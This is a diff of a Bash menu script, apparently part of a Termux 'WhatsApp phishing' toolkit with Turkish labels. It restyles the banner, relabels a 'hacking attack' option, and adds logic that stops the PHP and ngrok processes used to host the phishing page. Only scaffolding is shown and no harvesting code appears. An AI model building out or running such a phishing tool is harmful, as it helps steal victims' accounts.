@@ -1,25 +1,5 @@
 #!/bin/bash
 clear
-#http://www.network-science.de/ascii/
-#cyberlarge
-if [[ $1 == site ]];then
-	echo
-	echo
-	echo
-	printf "
-
-	SİTE \e[31m>\e[32m http://www.network-science.de/ascii\e[0m
-
-	YAZI FONTU \e[31m>\e[32m CYBERLARGE\e[0m
-
-	ADJUSTMENT \e[31m>\e[32m LEFT \e[31m=\e[32m CENTER\e[0m
-	"
-	echo
-	echo
-	echo
-	exit
-fi
-
 #################### GÜNLER ####################
 
 pazartesi=$(date |grep -o Mon)
@@ -33,50 +13,55 @@ pazar=$(date |grep -o Sun)
 #################### GÜNLERE GÖRE RENKLER ####################
 
 if [[ $pazartesi == Mon ]];then
-	renk1='\e[0m'
-	renk2='\e[32m'
+	color='\e[32m'
 elif [[ $sali == Tue ]];then
-	renk1='\e[0m'
-	renk2='\e[31m'
+	color='\e[33m'
 elif [[ $carsamba == Wed ]];then
-	renk1='\e[0m'
-	renk2='\e[33m'
+	color='\e[34m'
 elif [[ $persembe == Thu ]];then
-	renk1='\e[0m'
-	renk2='\e[34m'
+	color='\e[31m'
 elif [[ $cuma == Fri ]];then
-	renk1='\e[0m'
-	renk2='\e[36m'
+	color='\e[36m'
 elif [[ $cumartesi == Sat ]];then
-	renk1='\e[31m'
-	renk2='\e[34m'
+	color='\e[32m'
 elif [[ $pazar == Sun ]];then
-	renk1='\e[33m'
-	renk2='\e[34m'
+	color='\e[33m'
 fi
 
 #################### BANNER ####################
+
 printf "
-$renk1
- _  _  _ _     _ _______ _______ _______ _______  _____   _____ 
- |  |  | |_____| |_____|    |    |______ |_____| |_____] |_____]
- |__|__| |     | |     |    |    ______| |     | |       |      
+\e[97m
 
-$renk2
-  _____  _     _ _____ _______ _     _ _____ __   _  ______
- |_____] |_____|   |   |______ |_____|   |   | \  | |  ____
- |       |     | __|__ ______| |     | __|__ |  \_| |_____|
 
-   
-   \e[32mCoded By  \e[31m>\e[0m UmuT KaRa\e[32m
-   TELEGRAM  \e[31m>\e[0m @termuxegitimm\e[32m
-   İNSTAGRAM \e[31m>\e[0m @termuxegitim\e[32m
-   GİTHUB    \e[31m>\e[0m termux-egitim\e[32m
-   YOUTUBE   \e[31m>\e[0m termux-egitim
+
+　 　 ▒█░░▒█ ▒█░▒█ ░█▀▀█ ▀▀█▀▀ ▒█▀▀▀█ ░█▀▀█ ▒█▀▀█ ▒█▀▀█ 
+　 　 ▒█▒█▒█ ▒█▀▀█ ▒█▄▄█ ░▒█░░ ░▀▀▀▄▄ ▒█▄▄█ ▒█▄▄█ ▒█▄▄█ 
+　 　 ▒█▄▀▄█ ▒█░▒█ ▒█░▒█ ░▒█░░ ▒█▄▄▄█ ▒█░▒█ ▒█░░░ ▒█░░░ 
+$color
+
+　 　   ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▀█▀ ▒█▄░▒█ ▒█▀▀█ 
+　 　　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█░ ▒█▒█▒█ ▒█░▄▄ 
+　   　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▄█▄ ▒█░░▀█ ▒█▄▄█ 
+                        
+
+         \e[1;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+              $color C O D E D   B Y   U M U T   K A R A
+         \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	 \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	          $color T E R M U X X   T O O L S S
+  	 \e[0;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+		     +-+-+-+-+-+-+-+-+-+-+-+
+		         +-+-+-+-+-+-+-+
+			     +-+-+-+
+			       +-+
+			        +
 
 \e[0m
 
-\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mWHATSAPP HACKİNG ATTACK\e[97m
+\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mHACKİNG ATTACK\e[97m
 
 \e[31m[\e[97mK\e[31m]\e[97m ────────── \e[34mPHP & NGROK BAĞLANTIYI KES\e[97m
 
@@ -248,10 +233,31 @@ if [[ $secim == 1 ]];then
 	echo
 	dongu
 elif [[ $secim == k || $secim == K ]];then
-	bash pidkapat.sh
-	sleep 2
-	bash whatsapp_phishing.sh
-	exit
+	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
+	if [[ $kontrol == 1 ]];then
+		killall php
+		killall ngrok
+		echo
+		echo
+		echo
+		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
+		echo
+		echo
+		echo
+		sleep 2
+		bash whatsapp_phishing.sh
+	else
+		echo
+		echo
+		echo
+		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
+		echo
+		echo
+		echo
+		sleep 2
+		bash whatsapp_phishing.sh
+		exit
+	fi
 elif [[ $secim == g || $secim == G || $secim == .. ]];then
 	cd ../..
 	bash phishing-attack.sh
